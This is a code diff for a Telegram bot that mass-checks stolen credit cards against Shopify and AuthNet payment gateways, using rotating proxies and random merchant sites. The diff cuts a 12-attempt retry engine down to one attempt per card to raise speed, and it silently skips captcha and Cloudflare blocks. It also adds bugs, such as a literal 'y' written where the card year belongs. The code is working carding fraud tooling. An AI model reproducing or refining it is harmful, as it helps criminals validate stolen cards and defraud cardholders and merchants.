@@ -170,7 +170,6 @@ CE_HOURGLASS = '<tg-emoji emoji-id="5386367538735104399">⌛</tg-emoji>'
 CE_STAR = '<tg-emoji emoji-id="5794073296492303710">⭐</tg-emoji>'
 CE_THINK1 = '<tg-emoji emoji-id="5917785839428967062">🤔</tg-emoji>'
 CE_THINK2 = '<tg-emoji emoji-id="5918248669399754192">🤔</tg-emoji>'
-switch_emoji = '<tg-emoji emoji-id="5325547803936572038">✨</tg-emoji>'
 CE_THINK3 = '<tg-emoji emoji-id="5916025950809625537">🤔</tg-emoji>'
 CE_ALIEN = '<tg-emoji emoji-id="6028356293540977715">👾</tg-emoji>'
 CE_PHONE = '<tg-emoji emoji-id="5445059250382469069">📲</tg-emoji>'
@@ -186,7 +185,6 @@ CE_MAN = '<tg-emoji emoji-id="5447311106030726740">👨‍🦰</tg-emoji>'
 # ====================== CANCEL & STATUS EMOJIS ======================
 CE_CASH = '<tg-emoji emoji-id="5409048419211682843">💵</tg-emoji>'
 CE_PARTY = '<tg-emoji emoji-id="5461151367559141950">🎉</tg-emoji>'
-CE_CANDLE = '<tg-emoji emoji-id="5449449325434266744">❄️</tg-emoji>'
 CE_CANDLE = '<tg-emoji emoji-id="5451882707875276247">🕯</tg-emoji>'
 CE_TOP = '<tg-emoji emoji-id="5415655814079723871">🔝</tg-emoji>'
 CE_GEAR = '<tg-emoji emoji-id="5341715473882955310">⚙️</tg-emoji>'
@@ -250,7 +248,7 @@ COUNTRY_NAME_TO_CODE = {
     "GUERNSEY": "GG", "GUINEA": "GN", "GUINEA-BISSAU": "GW", "GUYANA": "GY", "HAITI": "HT", "HEARD ISLAND AND MCDONALD ISLANDS": "HM",
     "HOLY SEE (VATICAN CITY STATE)": "VA", "VATICAN CITY": "VA", "HONDURAS": "HN", "HONG KONG": "HK", "HUNGARY": "HU", "ICELAND": "IS",
     "INDIA": "IN", "INDONESIA": "ID", "IRAN, ISLAMIC REPUBLIC OF": "IR", "IRAN": "IR", "IRAQ": "IQ", "IRELAND": "IE",
-    "ISLE OF MAN": "IM", "ISRAEL": "IL", "ITALY": "IT", "JAMAICA": "JM", "JAPAN": "JP", "JERSEY": "JE",
+    "ISLE OF Man": "IM", "ISRAEL": "IL", "ITALY": "IT", "JAMAICA": "JM", "JAPAN": "JP", "JERSEY": "JE",
     "JORDAN": "JO", "KAZAKHSTAN": "KZ", "KENYA": "KE", "KIRIBATI": "KI", "KOREA, DEMOCRATIC PEOPLE'S REPUBLIC OF": "KP",
     "KOREA, REPUBLIC OF": "KR", "SOUTH KOREA": "KR", "KOREA": "KR", "KUWAIT": "KW", "KYRGYZSTAN": "KG",
     "LAO PEOPLE'S DEMOCRATIC REPUBLIC": "LA", "LAOS": "LA", "LATVIA": "LV", "LEBANON": "LB", "LESOTHO": "LS",
@@ -473,7 +471,7 @@ def extract_cc(text):
         y = '20' + y if len(y) == 2 else y
         cards.append(f"{c}|{m}|{y}|{cv}")
     if not cards:
-        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text): cards.append(f"{c}|{m}|{y}|{cv}")
+        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text): cards.append(f"{c}|{m}|y|{cv}")
     if not cards:
         for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
     return list(dict.fromkeys(cards))
@@ -788,7 +786,7 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             
             clean_rm = unsf(rm).lower()
             
-            # 🛑 [تصفية الأخطاء الغبية] - أي رد تافه يخص المنصة أو الحمايات يحول كخطأ موقع فوراً ليتم تخطيه صامتاً خلف الكواليس
+            # 🛑 [تصفية الأخطاء الغبية] - أي رد تافه يخص النظام أو حماية الحسابات يحول كخطأ موقع فوراً ليتم قتله
             junk_filters = [
                 'login', 'requires login', 'login required', 'requires_login', 'signin',
                 'cloudflare', 'challenge', 'captcha', 'robot', 'not supported', 'not shopify',
@@ -865,18 +863,17 @@ async def remove_proxy_by_url(uid, proxy_url):
                     break
     except Exception: pass
 
-# ====================== BULLETPROOF AUTO RETRY & SILENT SKIP ENGINE ======================
-async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=12):
-    attempts = 0
-    active_proxies = list(proxies) if proxies else []
-    active_sites = list(sites) if sites else ["touch-of-finland.myshopify.com"]
+# ====================== BULLETPROOF INSTANT SKIP ENGINE (NO RETRIES) ======================
+async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=1):
+    """
+    محرك الفحص الفوري من محاولة واحدة: يضرب الـ API مرة واحدة للكرت.
+    إذا واجه خطأ موقع تافه أو حماية (Site Error)، يتم إسقاطه صامتاً كـ Skipped بدون تكرار لتأمين CPM طيارة.
+    """
+    p_dict = random.choice(proxies) if proxies else None
+    p_url = p_dict['proxy_url'] if p_dict else None
+    s_target = random.choice(sites) if sites else "touch-of-finland.myshopify.com"
     
-    while attempts < max_retries:
-        attempts += 1
-        p_dict = random.choice(active_proxies) if active_proxies else None
-        p_url = p_dict['proxy_url'] if p_dict else None
-        s_target = random.choice(active_sites) if active_sites else "touch-of-finland.myshopify.com"
-        
+    try:
         if gateway_name == "Shopify":
             res = await check_shopify_api(SHOPIFY_API_URL_1, card, s_target, p_url, session)
         elif gateway_name == "AuthNet":
@@ -885,23 +882,11 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
             return {'status': 'Skipped', 'card': card}
             
         status = res.get('status')
-        
-        # إذا كانت النتيجة بنكية صريحة نخرج فوراً ونعتمدها
         if status in ['Charged', 'Approved', 'Insufficient', 'Dead']:
             return res
-            
-        # إذا واجهنا خطأ موقع غبي نقوم بحذف البروكسي والموقع من الفحص الحالي والمحاولة مجدداً بصمت خلف الكواليس
-        if status == 'Site Error':
-            if p_dict and len(active_proxies) > 1:
-                try: active_proxies.remove(p_dict)
-                except ValueError: pass
-            if s_target in active_sites and len(active_sites) > 1:
-                try: active_sites.remove(s_target)
-                except ValueError: pass
-            await asyncio.sleep(random.uniform(0.1, 0.3))
-            continue
-            
-    # إذا انتهت الـ 12 محاولة ولم نصل لرد موثق يتم إرجاع وضع التخطي الكامل
+    except Exception:
+        pass
+        
     return {'status': 'Skipped', 'card': card}
 
 def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
@@ -1447,7 +1432,7 @@ async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYP
     await styled_edit(msg_obj, f"<b>{CE_GEAR} {sf('Preparing Session...')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Loaded')}:</b> <code>{sf(str(len(cards)))} CCs</code>\n├ <b>{CE_GEAR} {sf('Threads')}:</b> <code>{sf(str(current_workers))}</code>\n╰ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gn)}</code>", buttons=None)
     asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))
 
-# ====================== HIGH-SPEED CPM RESIDUAL CORE MASS ENGINE ======================
+# ====================== RESIDUAL CPM ENGINE PROCESSOR ======================
 async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
     uid = update.effective_user.id
     tot = len(cards); chk = chg = app = ins = dec = err = 0
@@ -1510,23 +1495,27 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                         if not is_stopped():
                             await asyncio.sleep(random.uniform(0.05, 0.15))
                     
-                    if is_stopped(): break
+                    if is_stopped(): 
+                        queue.task_done()
+                        break
                     
                     c_st = time.time()
-                    # استدعاء محرك التدوير المطور ذو الـ 12 محاولة خلفية صامتة لتجنب أخطاء المواقع تماماً
-                    res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, uid, max_retries=12)
-                    if is_stopped(): break 
+                    # استدعاء المحرك الفوري لضرب الـ API مرة واحدة بدون حلقات تكرار تعطل الـ CPM
+                    res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, uid, max_retries=1)
+                    if is_stopped():
+                        queue.task_done()
+                        break 
                     
                     c_el = time.time() - c_st
                     status = res.get('status', 'Skipped')
                     raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
                     
-                    # 💎 [التخطي الصارم الكامل] - إذا فشلت كل المحاولات وعاد الوضع كـ Skipped، نتخطاه فوراً دون زيادة عداد الأخطاء ودون إزعاجك
+                    # 💎 [التخطي الصامت الصارم] - لو الكرت رجع بوضع الـ Skipped بسبب عطل الموقع، يسقط فوراً صامتاً بدون زيادة أي أخطاء
                     if status == 'Skipped':
                         queue.task_done()
                         continue
                         
-                    # الـ API جلب رد بنكي صريح ونظيف؛ يتم تدوينه الآن بشكل رسمي
+                    # الـ API جلب رد بنكي حقيقي نظيف؛ يتم تدوينه وزيادة عداد الفحص الرسمي فوراً
                     chk += 1
                     last_resp = sf((raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg)
                     
@@ -1546,7 +1535,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                 except Exception as e:
                     err += 1
                     last_resp = sf(f"Sys Err: {str(e)[:20]}")
-                    await asyncio.sleep(1)
+                    await asyncio.sleep(0.5)
                     
                 queue.task_done()
             await asyncio.sleep(0.01)
